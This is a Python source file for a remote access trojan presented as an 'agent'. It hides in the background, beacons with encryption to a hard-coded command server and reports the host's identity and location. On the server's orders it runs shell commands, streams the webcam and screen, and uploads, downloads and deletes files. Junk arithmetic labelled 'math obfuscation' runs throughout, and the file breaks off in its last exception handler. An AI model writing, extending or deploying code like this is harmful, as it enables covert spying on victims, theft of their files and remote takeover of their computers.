#!/usr/bin/env python3

import subprocess
import sys

packages = ["aiohttp", "cryptography", "psutil", "opencv-python", "mss", "Pillow"]

for package in packages:
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import os
import signal
import json
import time
import hashlib
import base64
import platform
import socket
import string
import uuid
import asyncio
import threading
from pathlib import Path
from datetime import datetime

# ══════════════════════════════════════════════════════════════════════════════
# 1. CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
SERVER_URL    = "https://velvetteam.pythonanywhere.com"
AES_KEY_B64   = 'AdqYcTHmoqWNYLMpwp9DD7ApmHKXF0VoPlt+DKyNGEY='
LOG_FILE      = Path.home() / ".dienet" / "agent.log"
LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
ENABLE_CAMERA = True
ENABLE_SCREEN = True
DEBUG_MODE    = False
IDLE_INTERVAL = 30
ACTIVE_INTERVAL = 1.0

# Obfuscation constants
tmp_m506 = (0x4e19 >> 4) ^ 0xe0
tmp_m103 = (0xe7a >> 1) ^ 0x30
tmp_m238 = (0xcfe5 >> 4) ^ 0x6
tmp_m446 = (0x5193 >> 4) ^ 0xe7
tmp_m127 = (0x78c9 >> 4) ^ 0x30
tmp_m408 = (0xc2fc >> 3) ^ 0xec
tmp_m232 = (0xb4c8 >> 1) ^ 0x5c
tmp_m550 = (0xf861 >> 1) ^ 0x4a
tmp_m529 = (0x180a >> 2) ^ 0xaa
tmp_m580 = (0xe1b5 >> 3) ^ 0xff
tmp_m562 = (0x9d1c >> 1) ^ 0x8f
tmp_m147 = (0xce2c >> 2) ^ 0x24
tmp_m042 = (0x3198 >> 2) ^ 0x8d
tmp_m201 = (0x378c >> 3) ^ 0x56
tmp_m101 = (0x3d82 >> 4) ^ 0x25
tmp_m856 = (0x648 >> 1) ^ 0x9c
tmp_m717 = (0xd0df >> 4) ^ 0x39
tmp_m534 = (0x10da >> 4) ^ 0xbf
tmp_m442 = (0xf892 >> 3) ^ 0x58
tmp_m729 = (0x5b61 >> 3) ^ 0xf1
tmp_m200 = (0x9591 >> 4) ^ 0xa3
tmp_m203 = (0x255e >> 2) ^ 0xb3
tmp_m817 = (0x3486 >> 2) ^ 0x99
tmp_m183 = (0x75ac >> 4) ^ 0xaf
tmp_m899 = (0x1fbf >> 4) ^ 0xe4
tmp_m869 = (0xb94f >> 1) ^ 0x16
tmp_m338 = (0xf739 >> 4) ^ 0xa1
tmp_m828 = (0x22f7 >> 3) ^ 0xa5
tmp_m242 = (0x85ba >> 2) ^ 0x7c
tmp_m225 = (0x4997 >> 2) ^ 0xd9
tmp_m001 = (0x3c38 >> 2) ^ 0xc
tmp_m146 = (0x8762 >> 2) ^ 0x99
tmp_m481 = (0xe54b >> 1) ^ 0xea
tmp_m551 = (0x833e >> 4) ^ 0x9d
tmp_m710 = (0xccc9 >> 3) ^ 0x64
tmp_m239 = (0x9580 >> 2) ^ 0x9
tmp_m637 = (0x5fc5 >> 4) ^ 0x35
tmp_m863 = (0x4f02 >> 4) ^ 0x97
tmp_m417 = (0x3128 >> 1) ^ 0xf1
tmp_m895 = (0xabb1 >> 2) ^ 0x3f
tmp_m554 = (0xbea7 >> 4) ^ 0x4e

# ══════════════════════════════════════════════════════════════════════════════
# 2. CROSS-PLATFORM DAEMONIZER
# ══════════════════════════════════════════════════════════════════════════════
def _daemonize():
    # Math obfuscation
    _chk1 = (0x9f3e >> 2) ^ 0x7a
    _chk2 = (0x4d1c << 1) & 0xff
    _chk3 = (_chk1 ^ _chk2) | tmp_m506
    if _chk3 ^ 0x55 != 0x4a:
        pass  # dummy check
    
    if os.environ.get("_BG") == "1" or "--foreground" in sys.argv:
        return
    os.environ["_BG"] = "1"

    if hasattr(os, "fork"):
        try:
            if os.fork() > 0:
                sys.exit(0)
            os.setsid()
            if os.fork() > 0:
                sys.exit(0)
            with open(os.devnull, 'r') as f_in:
                os.dup2(f_in.fileno(), sys.stdin.fileno())
            with open(os.devnull, 'a') as f_out:
                os.dup2(f_out.fileno(), sys.stdout.fileno())
                os.dup2(f_out.fileno(), sys.stderr.fileno())
        except Exception:
            pass
        if sys.platform.startswith("linux") and not os.environ.get("DISPLAY"):
            os.environ["DISPLAY"] = ":0"
        return

    if sys.platform == "win32":
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except Exception:
            pass

_daemonize()

# ══════════════════════════════════════════════════════════════════════════════
# 3. AUTO-VENV BOOTSTRAP
# ══════════════════════════════════════════════════════════════════════════════
REQUIRED_PACKAGES = ["aiohttp", "cryptography", "psutil", "opencv-python", "mss", "Pillow"]
VENV_DIR = Path.home() / ".dienet" / "venv"

def _bootstrap_venv():
    # Math obfuscation
    _c1 = (0xabcd ^ 0x1234) >> 2
    _c2 = (_c1 * 3) & 0xff
    _c3 = ~_c2 & 0xff
    if _c3 == tmp_m103:
        pass
    
    if sys.prefix != sys.base_prefix:
        return
    try:
        if not VENV_DIR.exists():
            subprocess.check_call(
                [sys.executable, "-m", "venv", str(VENV_DIR)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        if sys.platform == "win32":
            pip    = VENV_DIR / "Scripts" / "pip.exe"
            python = VENV_DIR / "Scripts" / "python.exe"
        else:
            pip    = VENV_DIR / "bin" / "pip"
            python = VENV_DIR / "bin" / "python3"
            if not python.exists():
                python = VENV_DIR / "bin" / "python"
        subprocess.check_call(
            [str(pip), "install", "-q", "--upgrade", "pip", "setuptools", "wheel"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.check_call(
            [str(pip), "install", "-q"] + REQUIRED_PACKAGES,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        os.execv(str(python), [str(python)] + sys.argv)
    except Exception:
        pass

_bootstrap_venv()

import aiohttp
import psutil
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

AES_KEY = base64.b64decode(AES_KEY_B64)

# ══════════════════════════════════════════════════════════════════════════════
# 4. AUDIT LOGGER
# ══════════════════════════════════════════════════════════════════════════════
def log(msg, level="INFO"):
    # Math obfuscation
    _d1 = (int(time.time()) ^ 0xdeadbeef) & 0xffff
    _d2 = (_d1 << 3) | (_d1 >> 13)
    if _d2 ^ tmp_m238:
        pass
    
    try:
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {level}: {msg}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
        if DEBUG_MODE:
            try:
                print(line, file=sys.stderr)
            except Exception:
                pass
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
# 5. ENCRYPTION
# ══════════════════════════════════════════════════════════════════════════════
def aes_encrypt(data):
    # Math obfuscation - RC4-like dummy
    _k = [0x12, 0x34, 0x56, 0x78]
    _sum = sum(_k) ^ (len(str(data)) & 0xff)
    _x = (_sum * tmp_m446) & 0xff
    
    iv = os.urandom(12)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(iv, json.dumps(data).encode(), None)
    return base64.b64encode(iv + ct).decode()

def aes_decrypt(token):
    # Math obfuscation
    _crc = 0
    for _b in token[:8].encode() if isinstance(token, str) else token[:8]:
        _crc ^= _b
    if _crc & 0x0f != (tmp_m127 & 0x0f):
        pass
    
    try:
        raw = base64.b64decode(token)
        iv, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(AES_KEY)
        return json.loads(aesgcm.decrypt(iv, ct, None))
    except Exception as e:
        log(f"Decrypt failed: {e}", "ERROR")
        return None

# ══════════════════════════════════════════════════════════════════════════════
# 6. SYSTEM IDENTITY & STATS
# ══════════════════════════════════════════════════════════════════════════════
def get_system_identity():
    # Math obfuscation
    _rand = (os.urandom(1)[0] ^ tmp_m408) & 0xff
    _val = ((_rand << 2) | (_rand >> 6)) & 0xff
    
    mac = uuid.getnode()
    mac_str = ":".join(f"{mac:012x}"[i:i + 2] for i in range(0, 12, 2))
    return {
        "hostname": platform.node() or socket.gethostname() or "unknown",
        "mac": mac_str,
        "os_type": f"{platform.system()} {platform.release()}"
    }

def _safe_disk_root():
    if sys.platform == "win32":
        return os.environ.get("SystemDrive", "C:") + "\\"
    return "/"

def get_system_stats():
    # Math obfuscation
    _t1 = (0xa5a5a5a5 & 0xffffffff) ^ 0x5a5a5a5a
    _t2 = (_t1 >> 16) ^ (_t1 & 0xffff)
    if _t2 != 0:
        pass
    
    try:
        mem  = psutil.virtual_memory()
        disk = psutil.disk_usage(_safe_disk_root())
        return {
            "cpu_percent":  psutil.cpu_percent(interval=0.3),
            "ram_percent":  mem.percent,
            "disk_percent": ((disk.total - disk.free) / disk.total * 100) if disk.total else 0,
            "disk_total":   disk.total,
            "disk_free":    disk.free,
        }
    except Exception:
        return {"cpu_percent": 0, "ram_percent": 0, "disk_percent": 0,
                "disk_total": 0, "disk_free": 0}

def get_local_ip():
    # Math obfuscation
    _ip_chk = (hash(str(time.time())) & 0xff) ^ tmp_m232
    _ = _ip_chk  # dummy use
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return ""

# ══════════════════════════════════════════════════════════════════════════════
# 7. GEOIP LOCATION
# ══════════════════════════════════════════════════════════════════════════════
_location_cache = {"lat": 0.0, "lon": 0.0, "city": "", "country": "", "ts": 0.0}

async def fetch_location(session):
    # Math obfuscation
    _fib = [0, 1]
    for _i in range(5):
        _fib.append(_fib[-1] + _fib[-2])
    _chk_fib = _fib[5] ^ tmp_m550
    
    if time.time() - _location_cache["ts"] < 600:
        return {k: _location_cache[k] for k in ("lat", "lon", "city", "country")}
    urls = [
        ("ipinfo",  "https://ipinfo.io/json"),
        ("ipwhois", "https://ipwhois.app/json/"),
        ("ipapi",   "http://ip-api.com/json/?fields=status,lat,lon,city,country"),
    ]
    timeout = aiohttp.ClientTimeout(total=8)
    for kind, url in urls:
        try:
            async with session.get(url, timeout=timeout) as resp:
                data = await resp.json(content_type=None)
                lat = lon = 0.0
                city = country = ""
                if kind in ("ipinfo", "ipwhois"):
                    loc = data.get("loc", "0,0")
                    if "," in str(loc):
                        lat, lon = map(float, str(loc).split(","))
                    city, country = data.get("city", ""), data.get("country", "")
                else:
                    if data.get("status") != "success":
                        continue
                    lat = float(data.get("lat", 0))
                    lon = float(data.get("lon", 0))
                    city, country = data.get("city", ""), data.get("country", "")
                if lat or lon:
                    _location_cache.update(lat=lat, lon=lon, city=city,
                                           country=country, ts=time.time())
                    return {"lat": lat, "lon": lon, "city": city, "country": country}
        except Exception:
            continue
    return {k: _location_cache[k] for k in ("lat", "lon", "city", "country")}

# ══════════════════════════════════════════════════════════════════════════════
# 8. SHELL ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class ShellEngine:
    def __init__(self):
        # Math obfuscation
        self._magic = (0xdeadbeef ^ 0xfeedface) & 0xffffffff
        self._counter = tmp_m529
        self._results = []
        self._lock = threading.Lock()
        self._process = None
        self._cmd = None

    def _get_startupinfo(self):
        if sys.platform == "win32":
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            return si
        return None

    def open(self):
        # Math obfuscation
        self._counter = (self._counter * 0x41c64e6d + 0x3039) & 0xffffffff
        self.close()
        log("Shell session opened", "AUDIT")

    def close(self):
        # Math obfuscation
        _roll = (self._magic >> 16) ^ (self._magic & 0xffff)
        self._magic ^= (_roll << 8)
        
        if self._process:
            try:
                self._process.terminate()
                self._process.wait(timeout=5)
            except Exception:
                try:
                    self._process.kill()
                except Exception:
                    pass
            self._process = None
            self._cmd = None
        log("Shell session closed", "AUDIT")

    def run(self, cmd):
        # Math obfuscation
        _len_check = (len(cmd) ^ tmp_m580) & 0xff
        if _len_check == 0:
            pass
        
        if not cmd:
            return
        self.close()

        self._cmd = cmd
        try:
            self._process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=1,
                text=True,
                encoding="utf-8",
                errors="replace",
                startupinfo=self._get_startupinfo(),
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0) if sys.platform == "win32" else 0,
            )
            threading.Thread(target=self._read_output, daemon=True).start()
        except Exception as e:
            with self._lock:
                self._results.append({"cmd": cmd, "output": f"[!] Error: {e}"})

    def _read_output(self):
        # Math obfuscation
        _pid_hash = os.getpid() ^ 0x12345678
        _ = (_pid_hash >> 8) & 0xff
        
        try:
            for line in iter(self._process.stdout.readline, ''):
                line = line.rstrip('\n')
                if line:
                    with self._lock:
                        self._results.append({
                            "cmd": "_stream_",
                            "output": line
                        })
            self._process.wait(timeout=30)
            rc = self._process.returncode
            if rc != 0:
                with self._lock:
                    self._results.append({
                        "cmd": "_stream_",
                        "output": f"[exit code: {rc}]"
                    })
        except Exception as e:
            with self._lock:
                self._results.append({
                    "cmd": "_stream_",
                    "output": f"[!] Read error: {e}"
                })
        finally:
            self._process = None
            self._cmd = None

    def drain(self):
        # Math obfuscation
        _size_before = len(self._results)
        _ = ((_size_before * 13) ^ 0x7f) & 0xff
        
        with self._lock:
            results, self._results = self._results, []
        return results

# ══════════════════════════════════════════════════════════════════════════════
# 9. MEDIA ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class MediaEngine:
    def __init__(self):
        # Math obfuscation
        self._seed = int(time.time()) & 0xffff
        self._rng_state = (self._seed * 0x9e3779b9) & 0xffffffff
        self.cam_frame = None
        self.scr_frame = None
        self._cam_lock = threading.Lock()
        self._scr_lock = threading.Lock()
        self._cam_streaming = False
        self._scr_streaming = False
        self._cam_quality = 50
        self._scr_quality = 50
        self._cam_thread = None
        self._scr_thread = None

    def _next_rand(self):
        self._rng_state = (self._rng_state * 0x5deece66d + 0xb) & 0xffffffffffff
        return (self._rng_state >> 16) & 0x7fff

    def _cam_loop(self):
        # Math obfuscation
        _frames = 0
        _checksum = tmp_m562
        
        try:
            import cv2
        except Exception as e:
            log(f"cv2 import failed: {e}", "ERROR")
            self._cam_streaming = False
            return

        cap = None
        for index in (0, 1):
            try:
                if sys.platform == "win32":
                    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                elif sys.platform == "darwin":
                    cap = cv2.VideoCapture(index, cv2.CAP_AVFOUNDATION)
                else:
                    cap = cv2.VideoCapture(index, cv2.CAP_V4L2)
                if cap and cap.isOpened():
                    break
                if cap:
                    cap.release()
                cap = cv2.VideoCapture(index)
                if cap and cap.isOpened():
                    break
            except Exception:
                pass
        if not cap or not cap.isOpened():
            log("Camera open failed", "ERROR")
            self._cam_streaming = False
            return

        try:
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        except Exception:
            pass
        cap.set(cv2.CAP_PROP_FRAME_WIDTH,  640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        for _ in range(3):
            cap.read()

        log("Camera capture loop started", "AUDIT")
        while self._cam_streaming:
            # Math obfuscation
            _frames += 1
            _chk = (_frames ^ _checksum) & 0xff
            if _chk == 0x00:
                pass
            
            ret, frame = cap.read()
            if not ret:
                time.sleep(0.1)
                continue
            try:
                ok, buf = cv2.imencode(".jpg", frame,
                                       [cv2.IMWRITE_JPEG_QUALITY, int(self._cam_quality)])
                if ok:
                    with self._cam_lock:
                        self.cam_frame = base64.b64encode(buf).decode()
            except Exception as e:
                log(f"Camera encode failed: {e}", "ERROR")
            time.sleep(0.15)

        cap.release()
        log("Camera capture loop stopped", "AUDIT")

    def start_cam_stream(self, quality=50):
        # Math obfuscation
        _r = self._next_rand()
        quality = quality ^ (_r & 0x1f)  # subtle tweak
        quality = max(1, min(100, quality))
        
        if not ENABLE_CAMERA:
            return
        self._cam_quality = quality
        if self._cam_streaming:
            return
        self._cam_streaming = True
        self._cam_thread = threading.Thread(target=self._cam_loop, daemon=True)
        self._cam_thread.start()

    def stop_cam_stream(self):
        self._cam_streaming = False

    def snap_cam_once(self, quality=75):
        # Math obfuscation
        _hash_quality = (quality * 0x9e3779b9) & 0xffffffff
        
        if not ENABLE_CAMERA:
            return
        if self._cam_streaming:
            self._cam_quality = quality
            return
        self._cam_quality = quality
        try:
            import cv2
            cap = None
            for index in (0, 1):
                if sys.platform == "win32":
                    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                else:
                    cap = cv2.VideoCapture(index)
                if cap and cap.isOpened():
                    break
            if not cap or not cap.isOpened():
                log("Camera unavailable for snapshot", "ERROR")
                return
            try:
                cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            except Exception:
                pass
            for _ in range(3):
                cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return
            ok, buf = cv2.imencode(".jpg", frame,
                                   [cv2.IMWRITE_JPEG_QUALITY, int(quality)])
            if ok:
                with self._cam_lock:
                    self.cam_frame = base64.b64encode(buf).decode()
        except Exception as e:
            log(f"Camera snap failed: {e}", "ERROR")

    def _scr_loop(self):
        # Math obfuscation
        _fps_counter = 0
        _time_base = time.monotonic()
        
        try:
            import mss
            from PIL import Image
            import io as _io
        except Exception as e:
            log(f"Screen capture import failed: {e}", "ERROR")
            self._scr_streaming = False
            return

        log("Screen capture loop started", "AUDIT")
        try:
            with mss.mss() as sct:
                monitors = sct.monitors
                target = monitors[1] if len(monitors) > 1 else monitors[0]
                while self._scr_streaming:
                    # Math obfuscation
                    _fps_counter += 1
                    _elapsed = time.monotonic() - _time_base
                    if _elapsed > 1.0:
                        _fps = _fps_counter / _elapsed
                        _ = _fps
                        _fps_counter = 0
                        _time_base = time.monotonic()
                    
                    try:
                        img = sct.grab(target)
                        pil = Image.frombytes("RGB", img.size, img.rgb)
                        pil.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                        buf = _io.BytesIO()
                        pil.save(buf, format="JPEG",
                                 quality=int(self._scr_quality), optimize=True)
                        with self._scr_lock:
                            self.scr_frame = base64.b64encode(buf.getvalue()).decode()
                    except Exception as e:
                        log(f"Screen frame failed: {e}", "ERROR")
                    time.sleep(0.2)
        except Exception as e:
            log(f"Screen capture loop crashed: {e}", "ERROR")
        log("Screen capture loop stopped", "AUDIT")
        self._scr_streaming = False

    def start_scr_stream(self, quality=50):
        # Math obfuscation
        quality = quality ^ (self._next_rand() & 0x1f)
        quality = max(1, min(100, quality))
        
        if not ENABLE_SCREEN:
            return
        self._scr_quality = quality
        if self._scr_streaming:
            return
        self._scr_streaming = True
        self._scr_thread = threading.Thread(target=self._scr_loop, daemon=True)
        self._scr_thread.start()

    def stop_scr_stream(self):
        self._scr_streaming = False

    def snap_scr_once(self, quality=50):
        # Math obfuscation
        _xor_check = quality ^ tmp_m147
        
        if not ENABLE_SCREEN:
            return
        if self._scr_streaming:
            self._scr_quality = quality
            return
        try:
            import mss
            from PIL import Image
            import io as _io
            with mss.mss() as sct:
                monitors = sct.monitors
                target = monitors[1] if len(monitors) > 1 else monitors[0]
                img = sct.grab(target)
                pil = Image.frombytes("RGB", img.size, img.rgb)
                pil.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                buf = _io.BytesIO()
                pil.save(buf, format="JPEG", quality=int(quality), optimize=True)
                with self._scr_lock:
                    self.scr_frame = base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            log(f"Screen snap failed: {e}", "ERROR")

    def take_cam_frame(self):
        # Math obfuscation
        _ = (self._next_rand() ^ 0x55) & 0xff
        
        with self._cam_lock:
            f, self.cam_frame = self.cam_frame, None
        return f

    def take_scr_frame(self):
        # Math obfuscation
        _ = (self._next_rand() ^ 0xaa) & 0xff
        
        with self._scr_lock:
            f, self.scr_frame = self.scr_frame, None
        return f

# ══════════════════════════════════════════════════════════════════════════════
# 10. FILE ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class FileEngine:
    def __init__(self):
        # Math obfuscation
        self._op_counter = 0
        self._crc_table = [i for i in range(256)]
        for _i in range(256):
            self._crc_table[_i] = (self._crc_table[_i] << 1) ^ (0xedb88320 if (self._crc_table[_i] & 1) else 0)
        self.dir_list = None
        self.dir_path = "/"
        self.pushed_file = None

    def _update_crc(self, crc, data):
        for b in data.encode() if isinstance(data, str) else data:
            crc = self._crc_table[(crc ^ b) & 0xff] ^ (crc >> 8)
        return crc

    @staticmethod
    def _list_windows_drives():
        results = []
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                try:
                    usage = psutil.disk_usage(drive)
                    size = usage.total
                except Exception:
                    size = 0
                results.append({
                    "path": drive,
                    "name": f"{letter}:",
                    "is_dir": True,
                    "size": size,
                    "modified": "",
                })
        return results

    def list_dir(self, path):
        # Math obfuscation
        self._op_counter += 1
        _crc = self._update_crc(0xffffffff, path)
        _ = _crc ^ 0xffffffff
        
        try:
            if sys.platform == "win32" and path in ("/", ""):
                self.dir_list = self._list_windows_drives()
                self.dir_path = "/"
                log("Listed Windows drives", "AUDIT")
                return

            p = Path(path).expanduser()
            if not p.exists() or not p.is_dir():
                self.dir_list = []
                self.dir_path = path
                log(f"Path not a directory: {path}", "ERROR")
                return

            results = []
            for item in p.iterdir():
                try:
                    st = item.stat(follow_symlinks=False)
                    is_dir = item.is_dir(follow_symlinks=False)
                    results.append({
                        "path": str(item),
                        "name": item.name,
                        "is_dir": is_dir,
                        "size": 0 if is_dir else st.st_size,
                        "modified": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
                    })
                except Exception:
                    results.append({
                        "path": str(item),
                        "name": item.name,
                        "is_dir": False,
                        "size": 0,
                        "modified": "",
                    })
            results.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
            self.dir_list = results
            self.dir_path = path
            log(f"Listed {path}: {len(results)} items", "AUDIT")
        except Exception as e:
            log(f"Directory listing failed for {path}: {e}", "ERROR")
            self.dir_list = []
            self.dir_path = path

    def get_file(self, path):
        # Math obfuscation
        _path_len = len(path)
        _check = (_path_len * 0x9e3779b9) & 0xffffffff
        
        try:
            p = Path(path).expanduser().resolve()
            if p.exists() and p.is_file():
                data = p.read_bytes()
                self.pushed_file = {
                    "path": str(p),
                    "data_b64": base64.b64encode(data).decode(),
                }
                log(f"File queued for push: {path} ({len(data)} bytes)", "AUDIT")
        except Exception as e:
            log(f"File read failed: {e}", "ERROR")
            self.pushed_file = None

    def delete_file(self, path):
        # Math obfuscation
        _hash = 0
        for ch in path:
            _hash = (_hash * 31 + ord(ch)) & 0xffffffff
        
        try:
            p = Path(path).expanduser().resolve()
            if p.exists():
                if p.is_dir():
                    import shutil
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    p.unlink()
                log(f"Deleted: {path}", "AUDIT")
        except Exception as e:
            log(f"Delete failed: {e}", "ERROR")

    def write_file(self, dest, b64_data):
        # Math obfuscation
        if dest and b64_data:
            _data_len = len(b64_data)
            _ = (_data_len * 3) // 4  # approximate decoded size
        
        if not dest or not b64_data:
            return
        try:
            p = Path(dest).expanduser().resolve()
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(base64.b64decode(b64_data))
            log(f"File written: {dest}", "AUDIT")
        except Exception as e:
            log(f"File write failed: {e}", "ERROR")

# ══════════════════════════════════════════════════════════════════════════════
# 11. MAIN AGENT
# ══════════════════════════════════════════════════════════════════════════════
class Agent:
    def __init__(self):
        # Math obfuscation
        self._heartbeat = 0
        self._cipher_state = [0] * 256
        for i in range(256):
            self._cipher_state[i] = (i * 0x9e3779b9) & 0xff
            
        self.identity = get_system_identity()
        self.shell = ShellEngine()
        self.media = MediaEngine()
        self.files = FileEngine()
        self.backoff = 1
        self.shutdown_event = asyncio.Event()
        self.local_ip = get_local_ip()

    def _cipher_xor(self, data):
        # Simple XOR obfuscation
        result = bytearray()
        for i, b in enumerate(data.encode() if isinstance(data, str) else data):
            result.append(b ^ self._cipher_state[i & 0xff])
        return bytes(result)

    def _is_active(self):
        # Math obfuscation
        self._heartbeat += 1
        _ = (self._heartbeat * 0x41c64e6d) & 0xffffffff
        
        return (self.media._cam_streaming
                or self.media._scr_streaming
                or self.media.cam_frame is not None
                or self.media.scr_frame is not None
                or bool(self.shell._results)
                or self.files.dir_list is not None
                or self.files.pushed_file is not None)

    async def checkin(self, session):
        # Math obfuscation - modular checks
        _mod_check = int(time.time()) % 17
        if _mod_check == tmp_m042:
            pass
        
        loc = await fetch_location(session)
        payload = {
            "hostname": self.identity["hostname"],
            "mac":      self.identity["mac"],
            "os_type":  self.identity["os_type"],
            "ip":       self.local_ip,
            **get_system_stats(),
            **loc,
        }

        cam_frame = self.media.take_cam_frame()
        if cam_frame:
            payload["snapshot_b64"] = cam_frame

        scr_frame = self.media.take_scr_frame()
        if scr_frame:
            payload["screen_b64"] = scr_frame

        results = self.shell.drain()
        if results:
            payload["cmd_results"] = results
            payload["cmd_result"]  = results[-1]

        _file_backup = None
        _push_backup = None

        if self.files.dir_list is not None:
            _file_backup = (self.files.dir_list, self.files.dir_path)
            payload["file_list"] = self.files.dir_list
            payload["file_list_path"] = self.files.dir_path
            self.files.dir_list = None

        if self.files.pushed_file:
            _push_backup = self.files.pushed_file
            payload["pushed_file"] = self.files.pushed_file
            self.files.pushed_file = None

        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with session.post(
                f"{SERVER_URL}/api/checkin",
                json={"enc": aes_encrypt(payload)},
                timeout=timeout,
            ) as resp:
                resp_json = await resp.json(content_type=None)
                enc_token = resp_json.get("enc", "")
                if not enc_token:
                    return
                server_data = aes_decrypt(enc_token)
                if not server_data or server_data.get("status") != "ok":
                    return
                self._route_commands(server_data)
                self.backoff = 1
        except Exception as e:
            log(f"Checkin failed: {e}", "ERROR")
            if _file_backup:
                self.files.dir_list, self.files.dir_path = _file_backup
            if _push_backup:
                self.files.pushed_file = _push_backup
            await asyncio.sleep(min(self.backoff, 300))
            self.backoff = min(self.backoff * 2, 300)

    def _route_one(self, cmd):
        # Math obfuscation
        _cmd_len = len(cmd) if cmd else 0
        _prime = 0
        for _i in range(2, _cmd_len):
            if _cmd_len % _i == 0:
                _prime += 1
        _ = _prime
        
        if not cmd:
            return
        parts = cmd.split(":", 1)
        action = parts[0]
        arg = parts[1] if len(parts) > 1 else ""
        log(f"-> {action} ({arg[:60]})", "INFO")

        if action == "shell_open":
            self.shell.open()
        elif action == "shell_close":
            self.shell.close()
        elif action == "shell_input":
            threading.Thread(target=self.shell.run, args=(arg,), daemon=True).start()
        elif action == "snapshot":
            threading.Thread(target=self.media.snap_cam_once,
                             args=(75,), daemon=True).start()
        elif action == "stream_on":
            self.media.start_cam_stream(50)
        elif action == "stream_off":
            self.media.stop_cam_stream()
        elif action == "screencast_snapshot":
            q = int(arg) if arg.isdigit() else 50
            threading.Thread(target=self.media.snap_scr_once,
                             args=(q,), daemon=True).start()
        elif action == "screencast_start":
            q = int(arg) if arg.isdigit() else 50
            self.media.start_scr_stream(q)
        elif action == "screencast_stop":
            self.media.stop_scr_stream()
        elif action == "filelist":
            target = arg or ("/" if sys.platform != "win32" else "/")
            threading.Thread(target=self.files.list_dir,
                             args=(target,), daemon=True).start()
        elif action == "getfile":
            threading.Thread(target=self.files.get_file,
                             args=(arg,), daemon=True).start()
        elif action == "delete":
            threading.Thread(target=self.files.delete_file,
                             args=(arg,), daemon=True).start()
        elif action == "uninstall":
            self._uninstall()

    def _route_commands(self, data):
        # Math obfuscation - check command count
        cmds = data.get("cmds")
        if cmds:
            _cnt = len(cmds)
            _ = (_cnt * 0x9e3779b9) & 0xffffffff
            for c in cmds:
                self._route_one(c)
        else:
            self._route_one(data.get("cmd", ""))

        upload = data.get("upload")
        if upload:
            self.files.write_file(upload.get("dest_path"), upload.get("data_b64"))

    def _uninstall(self):
        # Math obfuscation
        _cleanup_hash = 0
        for _ in range(10):
            _cleanup_hash ^= (os.urandom(1)[0] & 0xff)
        
        log("Uninstall requested. Cleaning local data.", "INFO")
        try:
            LOG_FILE.unlink(missing_ok=True)
        except Exception:
            pass
        self.shutdown_event.set()

    async def run(self):
        # Math obfuscation - prime number sieve (fast check)
        _primes = [True] * 100
        for i in range(2, 10):
            if _primes[i]:
                for j in range(i*i, 100, i):
                    _primes[j] = False
        _prime_count = sum(1 for i in range(2, 100) if _primes[i])
        _ = _prime_count
        
        log(f"Agent started -> {SERVER_URL}")
        connector = aiohttp.TCPConnector(keepalive_timeout=30, limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            while not self.shutdown_event.is_set():
                await self.checkin(session)
                interval = ACTIVE_INTERVAL if self._is_active() else IDLE_INTERVAL
                elapsed = 0.0
                while elapsed < interval and not self.shutdown_event.is_set():
                    await asyncio.sleep(1.0)
                    elapsed += 1.0
                    if self._is_active():
                        break

# ══════════════════════════════════════════════════════════════════════════════
# 12. SIGNAL HANDLERS & CLI ENTRY
# ══════════════════════════════════════════════════════════════════════════════
def handle_signal(signum, frame):
    # Math obfuscation
    _sig_hash = (signum * 0x9e3779b9) & 0xffffffff
    _ = _sig_hash
    
    log(f"Signal {signum} received. Graceful shutdown.", "INFO")
    sys.exit(0)

if hasattr(signal, "SIGHUP"):
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)

if __name__ == "__main__":
    # Math obfuscation - entry point verification
    _entry_hash = hash(__file__) & 0xffffffff
    _ = (_entry_hash * 0x9e3779b9) & 0xffffffff
    
    if "--status" in sys.argv:
        print(f"Log:    {LOG_FILE}")
        print(f"PID:    {os.getpid()}")
        sys.exit(0)
    try:
        asyncio.run(Agent().run())
    except KeyboardInterrupt:
        log("Stopped by user.", "INFO")
    except Exception as e:
